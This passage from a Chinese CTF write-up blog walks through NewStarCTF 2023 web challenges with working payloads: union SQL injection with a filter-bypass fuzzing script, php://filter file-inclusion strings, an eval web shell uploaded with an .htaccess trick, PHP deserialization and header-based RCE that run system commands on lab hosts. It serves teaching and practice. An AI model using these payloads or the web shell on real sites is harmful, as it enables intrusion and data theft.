    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-comment">//使用post请求打开一个api.php文件，并形成网页对象存储到xhr中</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//xhr网页建立一个网页请求头Content-Type，内容为application/json</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-comment">//创建一个json数据对象</span><br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-comment">//score是键，gameScore是value</span><br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        <span class="hljs-comment">//将json数据传输给xhr网页对象</span><br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>根据代码审计我们需要传输一个json数据给网页，这个json数据就是我们游戏的分数，使用bp抓包，在api.php所在网页传输一个json数据:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type:application/json<br><br>&#123;<br>   &quot;score&quot;:100000000000<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004154912262.png" alt="image-20231004154912262"></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004155124328.png" alt="image-20231004155124328"></p><p>我们在url中发现存在sql注入点:<br><img src="/images/2023-10-9-Newstar-2/image-20231004155156692.png" alt="image-20231004155156692"></p><p>猜测可能是通过id在数据库中寻找存在的记录然后回显到页面:<br>测试该网页是否存在sql报错:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004155327273.png" alt="image-20231004155327273"></p><p>发现网页不会回显报错信息，但是会回显数据库中搜索到，并返回的结果集，所以我们可以试试一下union注入法:</p><p>第一步：由于union注入需要确切知道select返回的字段数，所以需要先爆数据库的字段:</p><p>payload(order by,group by,union select 1,2,3,….):</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160721249.png" alt="image-20231004160721249"></p><p>发现有过滤,使用脚本扫一下有哪些关键词过滤:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br>black_list=[]<br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://64a5def2-4e23-45a6-a6e6-22ec898fc9f2.node4.buuoj.cn:81/?id=&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    da = data<br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(data)</span><br>    <span class="hljs-comment"># da = &quot;1&#123;&#125;&quot;.format(data)</span><br>    da = <span class="hljs-string">&quot;1&#x27;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data)<br>    r = requests.get(url+da)<br>    <span class="hljs-comment"># 使用time使请求能够拥有足够的时间去响应</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># 获取过滤网站响应信息</span><br>    reponse_txt = <span class="hljs-string">&quot;no!&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        black_list.append(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     # da = d</span><br><span class="hljs-comment">#     # da = &quot;1 &#123;&#125;&quot;.format(d)</span><br><span class="hljs-comment">#     da = d</span><br><span class="hljs-comment">#     # POST传输json数据</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;query&quot;:da</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     reponse_txt = &quot;Nonono&quot;</span><br><span class="hljs-comment">#     # print(r.text)</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         black_list.append(d)</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(d))</span><br><br><br><span class="hljs-built_in">print</span>(black_list)<br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004162813880.png" alt="image-20231004162813880"></p><p>我们先尝试使用大小写绕过法:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160824030.png" alt="image-20231004160824030"></p><p>发现绕过！！！</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,2,3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004160937013.png" alt="image-20231004160937013"></p><p>发现回显内容，所以可以确定select返回结果集的字段个数为5</p><p>第二步：爆数据库</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,database(),3,4,5 -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004163106775.png" alt="image-20231004163106775"></p><p>得到数据库:ctf</p><p>第三步：爆表:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">常规:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables Where table_schema= DATABASE(); -- &#x27;<br>暴力方式:<br>?id=-1&#x27;Union Select 1,Group_concat(table_name),3,4,5 from infOrmation_schema.tables -- &#x27;<br></code></pre></td></tr></table></figure><p>常规:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004164025606.png" alt="image-20231004164025606"></p><p>暴力:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004164224393.png" alt="image-20231004164224393"></p><p>最终我们发现一个关键的表:here_is_flag</p><p>第四步：爆表的字段:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;Union Select 1,Group_concat(column_name),3,4,5 from infOrmation_schema.COLUMNS Where table_schema = &#x27;ctf&#x27; And table_name = &#x27;here_is_flag&#x27;; -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004170217827.png" alt="image-20231004170217827"></p><p>得到字段flag</p><p>第五步：爆字段的值:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1&#x27;union Select 1,Group_concat(flag),3,4,5 from here_is_flag -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004170857984.png" alt="image-20231004170857984"></p><p>获得flag</p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-comment">//这里过滤了base编码和rot编码获取文件包含信息</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-comment">//存在文件包含漏洞</span><br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> nope<br></code></pre></td></tr></table></figure><p>提供文件包含漏洞的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.quoted-printable-encode/resource=flag.php<br>php://filter/read=convert.url-encode/resource=flag.php<br>php://filter/read=convert.base64-decode/resource=flag.php<br>php://filter/read=convert.base64url-decode/resource=flag.php<br>php://filter/read=convert.rot13/resource=flag.php<br>php://filter/read=convert.hex/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php<br>php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br>php://filter/read=convert.quoted-printable-decode/resource=flag.php<br>php://filter/read=convert.base64url-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">php://filter/read=convert.iconv.utf-8.utf-32/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004171344082.png" alt="image-20231004171344082"></p><h2 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004171830952.png" alt="image-20231004171830952"></p><p>这是一道文件上传题，我们先上传一个php文件并抓包一下:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004172115084.png" alt="image-20231004172115084"></p><p>发现bp没有响应，前端直接返回判断信息，要使bp能够抓取信息，可以在浏览器中关闭前端js</p><p>这里偷懒直接上传了用js写的php文件的图片形式:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">GIF89</span>a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;pass&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004172603995.png" alt="image-20231004172603995"></p><p>发现成功上传！！！</p><p>由于无法抓包，我们需要再上传.htaccess文件对同一个文件夹下的指定图片文件进行解析:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;FilesMatch &quot;showfiles3.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004172835389.png" alt="image-20231004172835389"></p><p>发现成功上传到同一目录下</p><p>访问木马图片:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004172930848.png" alt="image-20231004172930848"></p><p>成功！！！</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004173020270.png" alt="image-20231004173020270"></p><p>发现flag文件:this_is_flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&#x27;cat /this_is_flag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004173154948.png" alt="image-20231004173154948"></p><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//私有变量$cmd</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-comment">//反序列化会自动调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//过滤常规的文件打开命令</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">//进行系统命令执行</span><br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//反序列化传入的变量值</span><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>构造反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-comment">//私有变量只能直接赋值</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;ls /&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">// @system($this-&gt;cmd);</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// @unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj1</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj1</span>;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>这里发现url编码的内容无法被执行，所以采用源码<br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:4:&quot;ls /&quot;;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004175532104.png" alt="image-20231004175532104"></p><p>发现文件:th1s_1s_fffflllll4444aaaggggg</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:33:&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004175916496.png" alt="image-20231004175916496"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004212050514.png" alt="image-20231004212050514"></p><p>有题目的英文提示得，该网页存在文件泄露,先尝试.git泄露：</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004212637348.png" alt="image-20231004212637348"></p><p>发现存在bo0g1pop.php</p><p>对bo0g1pop.php进行代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//正则匹配funname(funname1()funname2())形式的字符串，即我们不能传参数在函数中</span><br><span class="hljs-comment">//\((?R)?\):表示将()作为递归的模板进行递归匹配字符串，递归一般从最里面进行匹配</span><br><span class="hljs-comment">//无参RCE</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//对一些函数进行过滤</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<span class="hljs-comment">//存在危险代码执行漏洞</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里使用无参RCE的函数:getallheaders()</p><p>这个函数的作用是获取http请求头中的信息，并以关联数组的形式返回:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">先观察该网页http请求头的第一个健是谁:<br>?star=print(getallheaders());<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004232607329.png" alt="image-20231004232607329"></p><p>由于直接输出数组头元素为Array,所以我们需要用next()函数使数组定位到第二个元素输出：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004232730086.png" alt="image-20231004232730086"></p><p>发现输出了请求头User-Agent的值，即第二个请求头的值</p><p>我们伪造一下第二个请求头User-Agent的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:666<br><br>?star=print(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234434183.png" alt="image-20231004234434183"></p><p>发现成功被执行</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;ls /&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234547770.png" alt="image-20231004234547770"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">headers:<br>User-Agent:system(&#x27;head /flag&#x27;);<br><br>?star=assert(next(getallheaders()));<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004234627391.png" alt="image-20231004234627391"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023_第一周WP</title>
    <link href="/2023/10/04/2023-10-4-Newstar_1/"/>
    <url>/2023/10/04/2023-10-4-Newstar_1/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-第一周WP"><a href="#NewStarCTF-2023-第一周WP" class="headerlink" title="NewStarCTF 2023_第一周WP"></a>NewStarCTF 2023_第一周WP</h1><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926133137466.png" alt="image-20230926133137466"></p><p>根据网页显示的内容，我们需要提供它一个number1和number2的值，没有告诉我们具体的请求方式，我们先用get请求先传输一个number1值试试:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?number1=1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926133446856.png" alt="image-20230926133446856"></p><p>发生报错，在报错信息中寻找一下有没有flag：<br><img src="/images/2023-10-4-Newstar-1/image-20230926133538322.png" alt="image-20230926133538322"></p><p>发现flag,这里应该是没有num2的值所以num2为空就报错显示了</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926133854855.png" alt="image-20230926133854855"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?ctf=1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926133932034.png" alt="image-20230926133932034"></p><p>更具提示我们需要寻找secret的值，并用post传参，网页显示上没有secret,那么在网页源码中找一下:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926134135307.png" alt="image-20230926134135307"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk)<br>=&gt;<br>Secret: n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?ctf=1<br>POST:<br>secret=n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134415967.png" alt="image-20230926134415967"></p><p>这里回显是认证信息，一般都是用cookie进行身份认证的，所以使用BP抓包:<br><img src="/images/2023-10-4-Newstar-1/image-20230926134605035.png" alt="image-20230926134605035"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:power=ctfer<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134653693.png" alt="image-20230926134653693"></p><p>我们需要修改我们访问的浏览器为NewStarCTF2023:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 